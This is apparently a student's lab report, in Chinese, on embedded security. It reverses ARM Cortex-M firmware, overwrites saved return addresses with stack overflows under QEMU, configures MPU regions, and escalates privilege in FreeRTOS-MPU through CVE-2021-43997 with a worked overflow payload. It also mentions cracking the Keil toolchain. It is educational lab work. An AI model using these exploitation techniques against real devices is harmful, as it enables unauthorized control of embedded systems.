

[TOC]



<div style="page-break-after:always;"></div>

# `PRE-WORK` 实验环境

### 主机

- `Windows 11`
- `IDA Version 7.0.170914`
- `MDK524a`、`Keil.V2M-MPS2_CMx_BS.pack`、`Keil.V2M-MPS2_DSx_BS.pack`

### 虚拟机

- `Kali linux 2022.1 amd64`
- `QEMU emulator version 7.0.0 (Debian 1:7.0+dfsg-1)`

<div style="page-break-after:always;"></div>

# `TASK1` 裸机物联网设备溢出漏洞利用

### 1. 加载文件找到`reset`函数

- 使用`IDA`打开`task1_23.elf`：

![image-20220629233507953](https://raw.githubusercontent.com/BIIIANG/pic/main/202206292335103.png)

- 在`Processor options -> Edit ARM architecture options`中选择基础架构为`ARMv7-M`，指令集为`Thumb-2`：

![image-20220629233707318](https://raw.githubusercontent.com/BIIIANG/pic/main/202206292337395.png)

- 保存以上配置并等待`IDA`加载完毕。由于使用的是`elf`文件，反汇编后在函数表中即可找到`Reset_Handler()`函数：

![image-20220629234728579](https://raw.githubusercontent.com/BIIIANG/pic/main/202206292347645.png)

### 2. 逆向存在溢出缓冲区的函数

- `main()`函数的反编译结果如下：

![image-20220629234426043](https://raw.githubusercontent.com/BIIIANG/pic/main/202206292347720.png)

- 对以上`main()`函数进行分析，跳过`init`部分，根据程序运行表现和函数名推测`HAL_UART_Transmit()`函数用于输出，`HAL_UART_Receive()`函数用于输入，初步分析如下，重点关注函数`HelpFunc()`和`Function()`：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  ...
  if ( HAL_UART_Init(&UartHandle) )
    Die();
  // 输出aTxBuffer中的内容："input your Student ID immediately\n"
  if ( HAL_UART_Transmit(&UartHandle, aTxBuffer, 34u, 5000u) )
    Error_Handler();
  // 接收用户输入到aRxBuffer，长度为4，超时时间为20000个时间单位
  if ( HAL_UART_Receive(&UartHandle, aRxBuffer, 4u, 20000u) )
    Error_Handler();
  // 将用户输入的长度为4的字符串转换为整数，相当于val=atoi(aRxBuffer)
  val = aRxBuffer[3] - '0' + 1000 * (aRxBuffer[0] - '0') + 100 * (aRxBuffer[1] - '0') + 10 * (aRxBuffer[2] - '0');
  aRxBuffer[4] = '\n';
  aRxBuffer[5] = 0;
  // 回显用户输入的长度为4的字符串
  if ( HAL_UART_Transmit(&UartHandle, aRxBuffer, 5u, 5000u) )
    Error_Handler();
  BSP_LED_On(LED6);
  SystemClock_Config();
  // 重点函数1
  HelpFunc();
  // 重点函数2
  Function("123456");
  while ( 1 )
    ;
}
```

- `HelpFunc()`函数反编译结果及注释如下：

```c
void HelpFunc()
{
  unsigned __int8 shellcode[8]; // [sp+4h] [bp+4h]
  unsigned __int8 vlen[4]; // [sp+Ch] [bp+Ch]
  unsigned __int8 length[2]; // [sp+10h] [bp+10h]
  unsigned __int8 Buffer[12]; // [sp+14h] [bp+14h]
  int len; // [sp+20h] [bp+20h]
  int j; // [sp+24h] [bp+24h]
  __int64 savedregs; // [sp+28h] [bp+28h]

  // 接收用户输入到length，长度为2，超时时间为500000个时间周期
  if ( HAL_UART_Receive(&UartHandle, length, 2u, 500000u) )
    Error_Handler();
  // 将用户输入的length复制到vlen并补齐回车和终结符'\0'
  vlen[0] = length[0];
  vlen[1] = length[1];
  vlen[2] = '\n';
  vlen[3] = 0;
  // 回显用户输入的长度
  if ( HAL_UART_Transmit(&UartHandle, vlen, 3u, 50000u) )
    Error_Handler();
  // 接收用户输入到shellcode，长度为8，超时时间为1000000个时间周期
  if ( HAL_UART_Receive(&UartHandle, shellcode, 8u, 1000000u) )
    Error_Handler();
  // shellcode为一个8位16进制数字符串，此处将其每个字符转换为数值，如'f' -> 15
  // 注意此处只能将小写的'a' ~ 'f'转换成其对应的数值，大写的'A' ~ 'F'未进行操作
  for ( j = 0; j <= 7; ++j )
  {
    if ( shellcode[j] <= (unsigned int)'/' || shellcode[j] > (unsigned int)';' )
    {
      if ( shellcode[j] > (unsigned int)'`' && shellcode[j] <= (unsigned int)'f' )
        shellcode[j] -= 'W';
    }
    else
    {
      shellcode[j] -= '0';
    }
  }
  // 将用户输入的长度转换为数值，即len=atoi(length)
  len = length[1] - '0' + 10 * (length[0] - '0');
  // 使用用户输入的shellcode覆盖Buffer[len] ~ Buffer[len+3]
  Buffer[len] = shellcode[1] + 16 * shellcode[0];
  *((_BYTE *)&savedregs + len - 19) = shellcode[3] + 16 * shellcode[2];
  *((_BYTE *)&savedregs + len - 18) = shellcode[5] + 16 * shellcode[4];
  *((_BYTE *)&savedregs + len - 17) = shellcode[7] + 16 * shellcode[6];
  // 输出aEndBuffer中的内容："Attack Finish\n"
  if ( HAL_UART_Transmit(&UartHandle, aEndBuffer, 0xEu, 10000u) )
    Error_Handler();
}
```

- 综合以上分析，`HelpFunc()`函数的功能即为读取用户输入的长度`len`和`shellcode`，并将`Buffer[len] ~ Buffer[len+3]`覆盖为`shellcode`，因此推测该函数即为存在溢出缓冲区的函数。
- 后续分析见`4.溢出函数栈图`和`5.栈溢出原理`。

### 3. 逆向找到`flag`打印函数

- 继续分析`main()`函数最后的`Function()`函数，观察其反编译结果，该函数未输出任何内容，根据函数操作猜测该函数的功能是计算`flag`，此处不再讨论该函数。
- 到此，`main()`函数中除库函数外，仅剩在`HAL_UART_Init(&UartHandle)`的错误处理中的`Die()`函数，该函数的反编译结果如下：

![image-20220630010954208](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300109264.png)

- 对其分析如下，根据其操作可以确定该函数就是输出`flag`的函数：

```c
void __noreturn Die()
{
  unsigned __int8 str[30]; // [sp+4h] [bp+4h]
  int i; // [sp+24h] [bp+24h]
  __int64 savedregs; // [sp+28h] [bp+28h]

  // 将val+1转换为字符串存储到str中，val+1即为flag
  itoa(val + 1, str, 10);
  // 将aRxBuffer的前4个字节设置为字符串"flag"
  aRxBuffer[0] = 'f';
  aRxBuffer[2] = 'a';
  aRxBuffer[1] = 'l';
  aRxBuffer[3] = 'g';
  // 将字符串str()中的flag串联在aRxBuffer后面
  for ( i = 4; i <= 33; ++i )
  {
    aRxBuffer[i] = *((_BYTE *)&savedregs + i - 40);
    if ( !*((_BYTE *)&savedregs + i - 40) )
      break;
  }
  // 输出aRxBuffer，其中包含flag
  if ( HAL_UART_Transmit(&UartHandle, aRxBuffer, i, 20000u) )
    Error_Handler();
  while ( 1 )
    ;
}
```

- `Die()`函数的地址为`0x080018E0`：

![image-20220630011408782](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300114845.png)

### 4. 溢出函数栈图

- `HelpFunc()`函数的栈帧如下所示：

![image-20220630011633342](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300116413.png)

- 将其转换为常见的栈的形式（高地址在上，低地址在下，从高向下生长）如下：

![image-20220630014104163](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300141220.png)

### 5. 栈溢出原理

- 结合`HelpFunc()`函数的栈帧，`FP ~ FP+7`存储着该函数保存的寄存器，而我们可以通过`HelpFunc()`函数向`Buffer[len] ~ Buffer[len+3]`写入任意值（见`2.逆向存在溢出缓冲区的函数`）。
- 有关`FP ~ FP+7`存储的寄存器的值分别是那两个寄存器，可以从`HelpFunc()`的反汇编的第一条指令得到，如下所示：

![image-20220630014438111](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300144176.png)

- `ARM`下`PUSH`指令的 入栈顺序是从右到左，因此`LR`首先入栈，然后`R7`入栈，之后在栈中分配局部变量，从而得到`4.溢出函数栈图`中的示意图。`LR`寄存器的作用见`ARM Cortex-M3与Cortex-M4权威指南 P107`：`LR`寄存器（链接寄存器）用于保存返回地址，使得在函数调用结束后处理器可以调回之前的程序。因此，只要通过`HelpFunc()`的栈溢出漏洞，向`FP+4 ~ FP+7`写入目标函数`Die()`的返回地址即可。
- `len`的值如`4.溢出函数栈图`中的示意图所示，`len = 0x14 + 0x4 = 0x18 = 24`。
- `shellcode`即为`addr(Die()) + 1 = 0x080018E0 + 1 = 0x080018E1`，此处地址最低位设为`1`表示为`thumb`代码的地址。由于字节序的原因，输入时应从低字节到高字节输入，即输入的`shellcode`为`E1180008`。由于对`HelpFunc()`的分析中可知该函数在将地址从字符串向数值转换时仅考虑了小写的`a ~ f`，因此输入的`shellcode`应为小写，即`e1180008`。

### 6. `QEMU`模拟运行固件获取`flag`

- 在`Kali linux 2022.1 amd64`下，安装该实验所需的`QEMU`只需使用`apt`工具安装`qemu-system-arm`即可：

```shell
sudo apt-get install qemu qemu-system-arm
```

- 安装完成后，使用以下命令启动`Qemu`并加载`task1_23.elf`：

```shell
qemu-system-arm -M netduinoplus2 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel task1_23.elf -D log.txt
```

- 启动`Qemu`后，即可根据以上分析过程依次输入：学号后四位`1803`，偏移距离`24`和目标函数的地址`e1180008`，结果如下，`flag`为`7217`：

![image-20220630020826730](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300208798.png)

<div style="page-break-after:always;"></div>

# `TASK2` 基于`MPU`的物联网设备攻击缓解技术

## `TASK2-1` 解除防止代码注入区域保护

### 1. 创建`Keil`工程并得到可执行文件

- 安装`MDK524a.exe`、`Keil.V2M-MPS2_CMx_BS.pack`、`Keil.V2M-MPS2_DSx_BS.pack`，并完成破解。
- 按照指导书创建工程并完成配置，编译得到`task2a.axf`。

### 2. 对可执行文件进行分析

- 首先分析`task2.c`，主函数的操作为：初始化变量`a = 1803`；调用`prvSetupHardware()`初始化硬件；`xTaskCreate()`创建任务，执行的函数为`vTaskStart()`；调用`StartFreeRTOS(a)`启动`FreeRTOS`；进入死循环。
- `vTaskStart()`中，调用了`AttackTest()`，该函数通过逆向进行分析。
- 使用`IDA`对`task2a.axf`进行逆向，追踪到`AttackTest()`的反编译结果如下，操作为向`0x4000`和`0x4010`写入`0x12345678`，然后跳转至`Judge()`函数：

![image-20220630030138767](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300301811.png)

- `Judge()`函数的反编译结果如下，首先读取`0xE000ED94`处的值并与`5`比较，若相等则将`0x20000038`处的值自增`2`，之后输出`flag`。

![image-20220630024543216](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300245264.png)

### 3. 分析`MPU`设置

- 首先查看已有的`MPU`设置，可知所有`MPU`设置的权限均为只支持特权读（`101`）：

```c
uint32_t *MPU_REG_CTRL = (uint32_t *)0XE000ED94;		// 控制寄存器
uint32_t *MPU_REG_RNR  = (uint32_t *)0XE000ED98;		// 区域编号寄存器
uint32_t *MPU_REG_RBAR = (uint32_t *)0XE000ED9C;		// 基地址寄存器
uint32_t *MPU_REG_RASR = (uint32_t *)0XE000EDA0;		// 区域属性和大小寄存器

void showMPU() {
	printf(" RNR   CTRL    RBAR         RASR\n");
	for (int i = 0; i < 8; i++) {
		*MPU_REG_RNR = i;
		printf( "%3d%7d  0x%08x   0x%08x\n", *MPU_REG_RNR, *MPU_REG_CTRL, *MPU_REG_RBAR, *MPU_REG_RASR );
	}
}

void vTaskStart( void *pvParameters )
{
	/* write your MPU re-configuration code here */
	showMPU();
    
	printf( "Attack test begin\n" );
	AttackTest();
	for(;;);
}
```

```shell
sudo qemu-system-arm -M mps2-an386 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel task2a.axf -D log.txt
```

![image-20220630041312277](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300413400.png)

- 查看日志文件，发生权限异常的位置如下所示，在尝试向`0x4000`和`0x4010`写入时出发了内存异常：

![image-20220630033121783](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300331837.png)

- `RASR`的`5:1`位表示区域的大小，经过转换后几个`MPU`区域的信息如下所示：

| `RNR` | `CTRL` |    `RBAR`     |    `RASR`    |     `SIZE`     |    `REGION`     |
| :---: | :----: | :-----------: | :----------: | :------------: | :-------------: |
|  `0`  |  `5`   | `0x00000000`  | `0x06070025` | `b10010 512KB` | `0x0 ~ 0x80000` |
|  `1`  |  `5`   | `0x00000001`  | `0x0507001d` | `b01110 32KB`  | `0x0 ~ 0x8000`  |
|  `2`  |  `5`   | `0x20000002`  | `0x01070011` | `b01000 512B`  |                 |
|  `3`  |  `5`   | `0x40010003`  | `0x15000017` |  `b01011 4KB`  |                 |
|  `4`  |  `5`   | `0x20000004`  | `0x0307001d` | `b01110 32KB`  |                 |
|  `5`  |  `5`   | `0x20000005`  | `0x01070011` | `b01000 512B`  |                 |
|  `6`  |  `5`   | `0x00000006`  | `0x00000000` |    `b00000`    |                 |
|  `7`  |  `5`   | `0x00000007 ` | `0x00000000` |    `b00000`    |                 |

- 根据以上信息，对`0x4000`和`0x4010`的写入操作违反了前两个`MPU`区域的规定。

### 4. 添加`MPU`区域以顺利输出`flag`

- 在区域`6`创建规则以允许写入指定内存。由于要求区域最小且权限最小，因此区域大小设置为最小的`32B`，即`RASR[5:1] = 0b00100`；权限设置为只支持特权级访问，即`RASR[26:24] = 0b001`；`TEX S C B`设置为`ROM, Flash`类型的普通存储器，即`RASR[21:16] = 0b000010`；由于区域只有`32B`，`SRD`不生效，均设为`0`，即`RASR[15:8] = 0b00000000`；区域使能设为`1`，即`RASR[0] = 0b1`。据此，得到以下操作：

```c
*MPU_REG_RNR  = 6;
*MPU_REG_RBAR = 0x4000;
//     | XN |   | AP  |    | TEX | SCB | SRD       |    | REGION SIZE | ENABLE
// 000 | 0  | 0 | 001 | 00 | 000 | 010 | 00000000  | 00 | 00100       | 1
*MPU_REG_RASR = 0x1020009;
```

- 经过以上增加第`6`个区域允许对`0x4000 ~ 0x4020`的特权级访问后，再次编译程序并通过`Qemu`运行，即可输出`flag: 316233`：

![image-20220630041446299](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300414415.png)

## `TASK2-2` 解除指定外设区域保护

### 1. 初始化

- 初始化工作同`TASK2-1`。

### 2. 对可执行文件进行分析

- 分析过程同`TASK2-1`，通过逆向分析可知`AttackTest()`函数中写入了`0x40040000`内存，其他与`TASK2-1`基本一致：

![image-20220630042532796](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300425847.png)

### 3. 分析`MPU`设置

- 该任务中的程序已有的`MPU`设置如下，可知与`TASK2-1`基本相同（除区域`3`）：

```shell
sudo qemu-system-arm -M mps2-an386 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel task2b.axf -D log.txt
```

![image-20220630042744045](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300427126.png)

- 因此，分析如下，违反了区域`3`的规则：

| `RNR` | `CTRL` |    `RBAR`     |    `RASR`    |     `SIZE`     |         `REGION`          |
| :---: | :----: | :-----------: | :----------: | :------------: | :-----------------------: |
|  `0`  |  `5`   | `0x00000000`  | `0x06070025` | `b10010 512KB` |      `0x0 ~ 0x80000`      |
|  `1`  |  `5`   | `0x00000001`  | `0x0507001d` | `b01110 32KB`  |      `0x0 ~ 0x8000`       |
|  `2`  |  `5`   | `0x20000002`  | `0x01070011` | `b01000 512B`  |                           |
|  `3`  |  `5`   | `0x40040003`  | `0x15000017` |  `b01011 4KB`  | `0x40040000 ~ 0x40041000` |
|  `4`  |  `5`   | `0x20000004`  | `0x0307001d` | `b01110 32KB`  |                           |
|  `5`  |  `5`   | `0x20000005`  | `0x01070011` | `b01000 512B`  |                           |
|  `6`  |  `5`   | `0x00000006`  | `0x00000000` |    `b00000`    |                           |
|  `7`  |  `5`   | `0x00000007 ` | `0x00000000` |    `b00000`    |                           |

### 4. 添加`MPU`区域以顺利输出`flag`

- 在区域`6`创建规则以允许写入指定内存。由于要求区域最小且权限最小，因此区域大小设置为最小的`32B`，即`RASR[5:1] = 0b00100`；权限设置为只支持特权级访问，即`RASR[26:24] = 0b001`；`TEX S C B`设置为`ROM, Flash`类型的普通存储器，即`RASR[21:16] = 0b000010`；由于区域只有`32B`，`SRD`不生效，均设为`0`，即`RASR[15:8] = 0b00000000`；区域使能设为`1`，即`RASR[0] = 0b1`。据此，得到以下操作：

```c
uint32_t *MPU_REG_CTRL = (uint32_t *)0XE000ED94;
uint32_t *MPU_REG_RNR  = (uint32_t *)0XE000ED98;
uint32_t *MPU_REG_RBAR = (uint32_t *)0XE000ED9C;
uint32_t *MPU_REG_RASR = (uint32_t *)0XE000EDA0;

void showMPU() {
	printf(" RNR   CTRL    RBAR         RASR\n");
	for (int i = 0; i < 8; i++) {
		*MPU_REG_RNR = i;
		printf( "%3d%7d  0x%08x   0x%08x\n", *MPU_REG_RNR, *MPU_REG_CTRL, *MPU_REG_RBAR, *MPU_REG_RASR );
	}
}


void vTaskStart( void *pvParameters )
{
	showMPU();
	
	*MPU_REG_RNR  = 6;
	*MPU_REG_RBAR = 0x40040000;
	//     | XN |   | AP  |    | TEX | SCB | SRD       |    | REGION SIZE | ENABLE
	// 000 | 0  | 0 | 001 | 00 | 000 | 010 | 00000000  | 00 | 00100       | 1
	*MPU_REG_RASR = 0x1020009;
	
	printf( "Add MPU done\n" );
	showMPU();
	
	printf( "Attack test begin\n" );
	AttackTest();
	for(;;);
}
```

- 经过以上增加第`6`个区域允许对`0x40040000 ~ 0x40040020`的特权级访问后，再次编译程序并通过`Qemu`运行，即可输出`flag: 632466`：

![image-20220630043547701](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300435813.png)

<div style="page-break-after:always;"></div>

# `TASK3` `FreeRTOS-MPU`保护绕过

## `TASK3-1` 编写`C`代码实现基于`FreeRTOS-MPU v10.4`的提权和指定函数查找

### 1. 寻找打印`Flag`的函数名称和地址

- 编译生成`task3a.axf`后，使用`IDA`进行分析，在字符串列表中找到了输出`flag`的格式化字符串：

![image-20220630044922633](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300449710.png)

- 跟踪该地址，可知该地址仅在`vTaskRemove()`中被引用，因此推测该函数即为打印`Flag`的函数：

![image-20220630045016587](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300450635.png)

- 查看`vTaskRemove()`函数的反编译结果如下，他的确是输出`Flag`的函数：

![image-20220630045145502](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300451560.png)

- 查看其地址为`0x000005F4`：

![image-20220630045219284](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300452346.png)

- 虽然找到了打印`Flag`的函数，但由于`MPU`的保护无法在用户态执行该函数，因此需要寻找用于提权的函数。

### 2. 寻找用于提权的函数名称和地址

- 在搜索`FreeRTOS`的相关漏洞时，在其官网找到了以下[页面](https://www.freertos.org/security/security_updates.html#:~:text=11%2F12%2F2021%20-%20FreeRTOS%20Kernel%20versions%2010.2.0%20to%2010.4.5,for%20this%20can%20be%20found%20at%20MITRE%3A%20CVE-2021-43997.)，该漏洞对应[`CVE-2021-43997`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43997)：

![image-20220630045735885](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300457966.png)

- 结合课件中的讲解：“由于`MPU`的保护普通任务如果需要使用内核`API`必须通过`MPU`封装的`API`。然后利用`SVC`中断提高特权级再执行内核`API`，最后返回再还原任务特权级。”，其中的`MPU_xxx()`函数相比于特权级的`xxx()`函数仅多出了提高特权级和还原特权级的操作，以`MPU_xTaskCreate()`为例，以下为`2021/9/11`的`MPU_xTaskCreat()`函数（见此[链接](https://github.com/FreeRTOS/FreeRTOS-Kernel/blob/61f75602439558355fee75dcbc60d8730e507368/portable/Common/mpu_wrappers.c)），可见该函数只是调用了`xPortRaisePrivilege()`即可进行提权：

```c
#if ( configSUPPORT_DYNAMIC_ALLOCATION == 1 )
    BaseType_t MPU_xTaskCreate( TaskFunction_t pvTaskCode,
                                const char * const pcName,
                                uint16_t usStackDepth,
                                void * pvParameters,
                                UBaseType_t uxPriority,
                                TaskHandle_t * pxCreatedTask ) /* FREERTOS_SYSTEM_CALL */
    {
        BaseType_t xReturn;
        BaseType_t xRunningPrivileged = xPortRaisePrivilege();

        xReturn = xTaskCreate( pvTaskCode, pcName, usStackDepth, pvParameters, uxPriority, pxCreatedTask );
        vPortResetPrivilege( xRunningPrivileged );
        return xReturn;
    }
#endif /* configSUPPORT_DYNAMIC_ALLOCATION */
```

- `xPortRaisePrivilege()`函数与上述函数在一个文件内，其在`2021/9/11`时的状态如下所示，其内部使用了宏`portIS_PRIVILEGED`，该宏调用了`SVC`中断，用于提升权限（见此[链接](https://github.com/FreeRTOS/FreeRTOS-Kernel/blob/719ceee352ba1c1af264bd0b34974cd90ff3acc3/portable/GCC/ARM_CM23/non_secure/portmacrocommon.h)）：

```c
BaseType_t xPortRaisePrivilege( void ) /* FREERTOS_SYSTEM_CALL */
{
    BaseType_t xRunningPrivileged;

    /* Check whether the processor is already privileged. */
    xRunningPrivileged = portIS_PRIVILEGED();

    /* If the processor is not already privileged, raise privilege. */
    if( xRunningPrivileged == pdFALSE )
    {
        portRAISE_PRIVILEGE();
    }

    return xRunningPrivileged;
}
```

```c
/**
 * @brief Raise an SVC request to raise privilege.
 *
 * The SVC handler checks that the SVC was raised from a system call and only
 * then it raises the privilege. If this is called from any other place,
 * the privilege is not raised.
 */
        #define portRAISE_PRIVILEGE()    __asm volatile ( "svc %0 \n" ::"i" ( portSVC_RAISE_PRIVILEGE ) : "memory" );
```

- 由于`xPortRaisePrivilege()`这个至关重要的用来提权功能是以函数存在的，因此只要能够劫持程序的控制流使程序跳转执行该函数，即可完成提权，因此存在很大的安全问题，这就是`CVE-2021-43997`的主要内容。为此，在`2021/11/16`的提交记录中，该函数被修改成了宏，放置在了`mpu_wrappers.h`中（见此[链接](https://github.com/FreeRTOS/FreeRTOS-Kernel/blob/6ac9aaec957a511ad7ce66e452eeb4b01964375d/include/mpu_wrappers.h)）。

![image-20220630052026604](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300520663.png)

```c
/**
 * @brief Calls the port specific code to raise the privilege.
 *
 * Sets xRunningPrivileged to pdFALSE if privilege was raised, else sets
 * it to pdTRUE.
 */
        #define xPortRaisePrivilege( xRunningPrivileged )                  \
    {                                                                      \
        /* Check whether the processor is already privileged. */           \
        xRunningPrivileged = portIS_PRIVILEGED();                          \
                                                                           \
        /* If the processor is not already privileged, raise privilege. */ \
        if( xRunningPrivileged == pdFALSE )                                \
        {                                                                  \
            portRAISE_PRIVILEGE();                                         \
        }                                                                  \
    }
```

- 至此，可以确定存在的提权漏洞即为`xPortRaisePrivilege()`以函数形式存在的漏洞。因此，用于提权的函数即为`xPortRaisePrivilege()`，其地址为`0x00008EDC`：

![image-20220630052533966](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300525049.png)

### 3. 根据以上漏洞完成漏洞利用

- 该任务可以填写任意代码，因此最简单的方式即为直接调用`xPortRaisePrivilege()`函数进行提权，然后进行特权操作输出`Flag`即可，因此修改后的代码如下（也可以结合使用函数地址和函数指针进行调用，此处直接调用了相应函数）：

```c
void vTask3( void * pvParameters ) {	
	
	/* write your malicious code here */
	xPortRaisePrivilege();
	vTaskRemove();

	printf("Attack successful!\n");
	
	for( ; ; ) {}
}
```

- 修改后编译生成可执行文件，执行方式和结果如下，`Flag`为`1264931`：

```shell
qemu-system-arm -M mps2-an386 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel task3a.axf -D log.txt
```

![image-20220630094423997](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300944089.png)

## `TASK3-2` 利用溢出漏洞实现在`FreeRTOS MPU V10.4 `版本的系统提权和`Flag`函数打印

### 1. 寻找存在溢出的缓冲区

- 使用`IDA`进行逆向分析，主函数的反编译结果及相关注释如下：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  uint32_t i; // r4
  int v4; // r1
  unsigned int value; // [sp+0h] [bp-10h]
  uint32_t id; // [sp+4h] [bp-Ch]

  value = (unsigned int)envp;
  prvSetupHardware();
  // 输入学号后4位并回显
  _2printf("input your last 4-digital id, please press 'Enter' to end\n");
  _0scanf("%u", &id);
  _2printf("id = %u\n");
  // 输入buffer长度，应小于100，否则会提前退出，被存储在length中
  _2printf("input Total buffer length, please press 'Enter' to end\n");
  _0scanf((const char *)&dword_9CE0, &length);
  if ( length < 0x64 )
  {
    // 输入十六进制的构造得到的buffer内容并回显，被存储到InputBuffer中
    _2printf("please input your %d-bytes overflow buffer Byte by Byte in hex value, please press 'Enter' to end once input\n");
    for ( i = 0; i < length; ++i )
    {
      _0scanf((const char *)&dword_9D0C, &value);
      InputBuffer[i] = value;
      v4 = InputBuffer[i];
      _2printf(&dword_9D14);
    }
  }
  else
  {
    _2printf("buffer length should less than 100\n");
  }
  StartFreeRTOS(id, (TaskFunction_t)vTask3);
  while ( 1 )
    ;
}
```

- 主函数分析完毕，跟随程序流程分析`vTask3()`函数，该层没有敏感操作：

```c
void __fastcall __noreturn vTask3(void *pvParameters)
{
  int v1; // r1
  int v2; // r2
  int v3; // r3

  Function((int)pvParameters, v1, v2, v3);
  _2printf("Attack successful!\n");
  while ( 1 )
    ;
}
```

- 继续分析`Function()`函数，可知该函数的`HelperBuffer`可能发生缓冲区溢出：

```c
void __fastcall Function(int a1, int a2, int a3, int a4)
{
  uint32_t i; // r0
  unsigned __int8 HelperBuffer[10]; // [sp+0h] [bp-10h]

  *(_DWORD *)HelperBuffer = a2;
  *(_DWORD *)&HelperBuffer[4] = a3;
  *(_DWORD *)&HelperBuffer[8] = a4;
  // HelperBuffer的长度只有10，但length是由用户输入的，可以大于10，因此此处存在缓冲区溢出
  for ( i = 0; i < length; ++i )
    HelperBuffer[i] = InputBuffer[i];
  Helper();
}
```

### 2. 存在缓冲区溢出的函数的栈示意图

- 使用`IDA`查看`Function()`的栈帧如下：

![image-20220630054517122](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300545206.png)

- 将其转换为常见的栈的形式（高地址在上，低地址在下，从高向下生长）如下：

![image-20220630062739074](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300627154.png)

### 3. 栈的溢出原理

- 要想通过缓冲区溢出提权，首先就要控制执行流执行`TASK3-1`中提到的提权函数`xPortRaisePrivilege()`，该函数在该程序中的地址及函数流程如下：

![image-20220630063123371](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300631448.png)

- 若直接跳转到`xPortRaisePrivilege()`的起始地址，由于其`PUSH`操作与`POP`操作是相对应的，且无法修改一开始`PUSH`操作时入栈的`LR`寄存器的值，因此此时的执行流将在执行完`xPortRaisePrivilege()`后返回`Function()`的最后一个`POP {R1-R3,PC}`指令继续执行，因此若想控制下一个函数的执行，就至少要在之前覆盖`LR`寄存器在栈里的保留值得基础上在栈中再写入`16`个字节。而在实际测试中发现，该程序尽管规定`length < 100`，但当`length = 28`时，无论输入的内容为何，都会在`Function()`的`for`循环内发生内存错误，跳转到`MemManage_Handler()`，因此`length`必须满足`length <= 24`。而在当前的假设下，即跳转到`xPortRaisePrivilege()`的起始地址，要求输入的长度至少要为`32`，因此无法满足。
- 为了解决以上问题，考虑在跳转到`xPortRaisePrivilege()`时不跳转到起始地址，而是跳转到`PUSH`语句的下一个语句，从而避免`PUSH`语句压栈两次造成的必须多输入的`8`个字节，从而恰好能满足`length <= 24`的要求。据此，构造的栈如下所示，函数地址额外`+1`是为了表明为`thumb`代码的地址：

![image-20220630065553164](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300655271.png)

- 函数`xPortRaisePrivilege()`的地址上文已经提到，为`0x000086E2`；函数`vTaskRemove()`的地址如下，为`0x00001C7C`：

![image-20220630065959279](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300659354.png)

- 使用以上栈结构，需要输入的字节数为`24`字节，其中`0 ~ 11`个字节为任意值；`12 ~ 15`个字节为`xPortRaisePrivilege() + 3 = 0x000086E5`，由于字节序的影响，实际输入的应该是`E5 86 00 00`；`16 ~ 19`个字节为任意值；`20 ~ 23`个字节为`vTaskRemove() + 1 = 0x00001C7D`，由于字节序的影响，实际输入的应该是`7D 1C 00 00`。

### 4. `Qemu`模拟运行固件的获取`flag`

- 使用以下命令运行该固件：

```shell
qemu-system-arm -M mps2-an386 -cpu cortex-m4 -m 16M -nographic -d in_asm,nochain -kernel task3b_23.axf -D log.txt
```

- 使用`3.栈的溢出原理`中构造的攻击字符串，结果如下，`flag`为`2529860`：

![image-20220630070539319](https://raw.githubusercontent.com/BIIIANG/pic/main/202206300705438.png)

<div style="page-break-after:always;"></div>

# `EXT` 附加思考题

### 1. 如何利用溢出漏洞实现在`FreeRTOS MPU V10.5 `版本的系统提权和`Flag`函数打印

- `FreeRTOS MPU V10.5 `中的`xPortRaisePrivilege()`已被替换为使用宏实现，但最终提权的核心是调用了`SVC`中断的那一条嵌入汇编语句，只要在程序中存在某次使用该调用使得程序内存在该语句，那么就可以通过缓冲区溢出跳转到该`SVC`中断调用对应的汇编语句处，通过执行该汇编语句实现提权。

<div style="page-break-after:always;"></div>

# `AFTER-WORK` 实验心得

- 本次实验的难度比较大，原因是涉及到了许多不熟悉的领域，比如嵌入式设备的模拟、`ARM`架构下的汇编、`MPU`保护机制等。正因如此，在做完本次实验后，虽然实验中的内容不能保证已经全部理解，但我也收获了很多新的知识，对嵌入式安全有了一些初步的了解，从学习收获上来说是非常丰富的。此次实验中涉及到`ARM`架构下的程序的逆向分析，对于只接触过`x86`汇编的我来说是有一定难度的。但在一步步学习`ARM`指令集和架构相关知识并分析程序的过程中，类比`x86`汇编，`ARM`汇编也能较快地了解，因此从类比中学习是一项重要的技能。
